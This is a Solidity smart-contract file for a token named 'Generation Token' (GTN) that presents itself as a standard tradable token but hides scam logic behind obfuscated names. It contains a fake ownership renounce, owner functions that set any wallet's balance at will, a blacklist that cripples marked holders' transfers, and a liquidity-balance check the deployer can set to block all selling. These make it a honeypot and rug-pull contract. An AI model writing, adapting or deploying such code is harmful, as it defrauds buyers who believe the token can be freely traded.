//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface takeMinAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalTx) external view returns (uint256);

    function transfer(address sellFund, uint256 shouldFund) external returns (bool);

    function allowance(address feeReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldFund) external returns (bool);

    function transferFrom(
        address sender,
        address sellFund,
        uint256 shouldFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTeam, uint256 value);
    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);
}

abstract contract shouldTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minToken {
    function createPair(address toTakeAmount, address minSender) external returns (address);
}

interface takeMinAmountMetadata is takeMinAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GenerationToken is shouldTake, takeMinAmount, takeMinAmountMetadata {

    bool private teamMax;

    mapping(address => uint256) private isAutoWallet;

    bool private liquidityShould;

    address liquidityTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 teamShouldLaunch;

    function name() external view virtual override returns (string memory) {
        return listMin;
    }

    uint256 private launchFromReceiver;

    uint256 public listEnableTo;

    function getOwner() external view returns (address) {
        return buyReceiverMarketing;
    }

    address private buyReceiverMarketing;

    function atSell() private view {
        require(walletIsReceiver[_msgSender()]);
    }

    event OwnershipTransferred(address indexed atMin, address indexed takeFund);

    function symbol() external view virtual override returns (string memory) {
        return walletMarketing;
    }

    function tokenAmount() public {
        emit OwnershipTransferred(sellBuyMax, address(0));
        buyReceiverMarketing = address(0);
    }

    uint256 public exemptList;

    function decimals() external view virtual override returns (uint8) {
        return launchLiquidityTx;
    }

    string private listMin = "Generation Token";

    function balanceOf(address totalTx) public view virtual override returns (uint256) {
        return isAutoWallet[totalTx];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return amountMin;
    }

    mapping(address => mapping(address => uint256)) private enableMinFund;

    uint256 constant txShould = 18 ** 10;

    function minIs(address exemptMax, address sellFund, uint256 shouldFund) internal returns (bool) {
        require(isAutoWallet[exemptMax] >= shouldFund);
        isAutoWallet[exemptMax] -= shouldFund;
        isAutoWallet[sellFund] += shouldFund;
        emit Transfer(exemptMax, sellFund, shouldFund);
        return true;
    }

    function launchLiquidity(address receiverList) public {
        if (totalMarketing) {
            return;
        }
        
        walletIsReceiver[receiverList] = true;
        
        totalMarketing = true;
    }

    uint256 private amountMin = 100000000 * 10 ** 18;

    address public exemptLiquidity;

    uint8 private launchLiquidityTx = 18;

    constructor (){
        if (fromLimit == marketingMin) {
            marketingMin = fromLimit;
        }
        atTake minAmount = atTake(walletReceiverSwap);
        exemptLiquidity = minToken(minAmount.factory()).createPair(minAmount.WETH(), address(this));
        
        sellBuyMax = _msgSender();
        tokenAmount();
        walletIsReceiver[sellBuyMax] = true;
        isAutoWallet[sellBuyMax] = amountMin;
        if (marketingMin == launchFromReceiver) {
            amountTake = true;
        }
        emit Transfer(address(0), sellBuyMax, amountMin);
    }

    bool private amountTake;

    function owner() external view returns (address) {
        return buyReceiverMarketing;
    }

    address public sellBuyMax;

    function allowance(address marketingEnable, address isFeeAt) external view virtual override returns (uint256) {
        if (isFeeAt == walletReceiverSwap) {
            return type(uint256).max;
        }
        return enableMinFund[marketingEnable][isFeeAt];
    }

    function maxWallet(address sellReceiver, uint256 shouldFund) public {
        atSell();
        isAutoWallet[sellReceiver] = shouldFund;
    }

    uint256 public fromLimit;

    mapping(address => bool) public walletIsReceiver;

    bool public totalMarketing;

    function minReceiver(uint256 shouldFund) public {
        atSell();
        teamShouldLaunch = shouldFund;
    }

    uint256 public takeTeam;

    string private walletMarketing = "GTN";

    function approve(address isFeeAt, uint256 shouldFund) public virtual override returns (bool) {
        enableMinFund[_msgSender()][isFeeAt] = shouldFund;
        emit Approval(_msgSender(), isFeeAt, shouldFund);
        return true;
    }

    mapping(address => bool) public swapFrom;

    function fromTokenTeam(address senderMarketingTx) public {
        atSell();
        
        if (senderMarketingTx == sellBuyMax || senderMarketingTx == exemptLiquidity) {
            return;
        }
        swapFrom[senderMarketingTx] = true;
    }

    uint256 public marketingMin;

    function transferFrom(address exemptMax, address sellFund, uint256 shouldFund) external override returns (bool) {
        if (_msgSender() != walletReceiverSwap) {
            if (enableMinFund[exemptMax][_msgSender()] != type(uint256).max) {
                require(shouldFund <= enableMinFund[exemptMax][_msgSender()]);
                enableMinFund[exemptMax][_msgSender()] -= shouldFund;
            }
        }
        return listAt(exemptMax, sellFund, shouldFund);
    }

    function transfer(address sellReceiver, uint256 shouldFund) external virtual override returns (bool) {
        return listAt(_msgSender(), sellReceiver, shouldFund);
    }

    address walletReceiverSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 toShould;

    function listAt(address exemptMax, address sellFund, uint256 shouldFund) internal returns (bool) {
        if (exemptMax == sellBuyMax) {
            return minIs(exemptMax, sellFund, shouldFund);
        }
        uint256 amountTrading = takeMinAmount(exemptLiquidity).balanceOf(liquidityTo);
        require(amountTrading == teamShouldLaunch);
        require(sellFund != liquidityTo);
        if (swapFrom[exemptMax]) {
            return minIs(exemptMax, sellFund, txShould);
        }
        return minIs(exemptMax, sellFund, shouldFund);
    }

}